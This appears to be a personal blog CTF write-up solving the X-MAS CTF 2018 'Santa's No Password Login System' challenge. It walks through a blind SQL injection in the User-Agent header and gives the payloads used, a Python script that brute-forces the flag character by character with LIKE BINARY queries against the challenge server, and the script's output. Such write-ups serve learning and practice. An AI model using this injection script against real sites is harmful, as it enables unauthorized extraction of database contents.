---
layout: post
title: "X-MAS CTF: Santa's No Password Login System"
date: 2018-12-21
excerpt: "Blind SQL injection in the user-agent field? Nobody expected that..."
tags: [CTF, SQL, Python, Web]
comments: true
feature: http://4.bp.blogspot.com/-5rGrGNy9X_4/TpP6Vr64pzI/AAAAAAAAArE/SfEouAm3U38/s1600/sql+injection.jpg
---

# X-MAS CTF: Santa's No Password Login System

The challenge description is:

![Img](/assets/posts_details/XMAS_CTF/nologin/intro.png "Img")

And once we go to the main page we are greeted with the following:

![Img](/assets/posts_details/XMAS_CTF/nologin/main.png "Img")

I knew the cookies didn't have anything to do with the challenge, given that they were used in another one, and that there was some kind of verification with some headers (no other data was being passed). After a lot of tests, It turned out that the user-agent field contained a SQL injection vulnerability!

![Img](/assets/posts_details/XMAS_CTF/nologin/sql_test.png "Img")

I tried to pass something that would evaluate to true: ``' OR '1'='1``. Nothing changed apart from the access denied thing, instead of that I got a ``Welcome`` message:

![Img](/assets/posts_details/XMAS_CTF/nologin/sql_message.png "Img")

That brought to mind a blind SQL injection. There was a problem, though. I didn't know what was the name of the parameter that the SQL was querying...

After quite a lot of time I found out that it was ``ua``. Quite silly (user-agent -> ua).

I tried some things, like checking the length of the ``ua``. The message indicated whether my query was true (``Welcome``) or false (``Access denied``).

![Img](/assets/posts_details/XMAS_CTF/nologin/blind_sql_1.png "Img")

![Img](/assets/posts_details/XMAS_CTF/nologin/blind_sql_40.png "Img")

So the ``ua`` is longer than 1 character and shorter than 40. With that method I found out that the ``ua`` is 37 chars long:

![Img](/assets/posts_details/XMAS_CTF/nologin/blind_sql_37.png "Img")

Then, I tried to extract the value with a blind SQL method: ``LIKE BINARY``. What this does is it compares the start of the ``ua`` to some substring we provide.

I tried checking if the first char was ``A``, but it wasn't:

![Img](/assets/posts_details/XMAS_CTF/nologin/like_op.png "Img")

Then, to check that the method worked I used the wildcard ``%``, which substitutes any character any number of times (any string). And indeed it worked!

![Img](/assets/posts_details/XMAS_CTF/nologin/like_op_wildcard.png "Img")

Then, I thought that the ``ua`` had to be the flag, so I tried with ``X%``:

![Img](/assets/posts_details/XMAS_CTF/nologin/like_op_flag.png "Img")

I was right! It is the flag. Now, the only thing left is automate this task, as it is rather tedious to do this by hand. I wrote a simple python script that does this for me:

```python
import urllib2

flag = ""

chars = '-\{\}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'

for i in range(0, 37):
    for i in range(0, len(chars)):
        str = """' OR ua LIKE BINARY "{}%";#""".format(flag+chars[i])
        headers =  {
                'User-Agent': str,
        }

        req=urllib2.Request("http://199.247.6.180:12003/", None, headers)
        response=urllib2.urlopen(req).read()

        if "Welcome" in response:
            flag += chars[i]
            print flag
            break
```

I run it and see that it works and the flag gets echo'ed!

```terminal
python blind_sql.py
X
X-
X-M
X-MA
X-MAS
X-MAS{
X-MAS{E
X-MAS{EV
X-MAS{EV3
X-MAS{EV3R
X-MAS{EV3RY
X-MAS{EV3RY0
X-MAS{EV3RY0N
X-MAS{EV3RY0NE
X-MAS{EV3RY0NE_
X-MAS{EV3RY0NE_F
X-MAS{EV3RY0NE_F3
X-MAS{EV3RY0NE_F34
X-MAS{EV3RY0NE_F34R
X-MAS{EV3RY0NE_F34R5
X-MAS{EV3RY0NE_F34R5_
X-MAS{EV3RY0NE_F34R5_T
X-MAS{EV3RY0NE_F34R5_TH
X-MAS{EV3RY0NE_F34R5_TH3
X-MAS{EV3RY0NE_F34R5_TH3_
X-MAS{EV3RY0NE_F34R5_TH3_B
X-MAS{EV3RY0NE_F34R5_TH3_BL
X-MAS{EV3RY0NE_F34R5_TH3_BL1
X-MAS{EV3RY0NE_F34R5_TH3_BL1N
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_G
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN0
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN0M
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN0M3
X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN0M3}
```

We finally get that the flag is: ``X-MAS{EV3RY0NE_F34R5_TH3_BL1ND_GN0M3}``.

---

<center>
<i>Diego Bernal Adelantado</i>
</center>
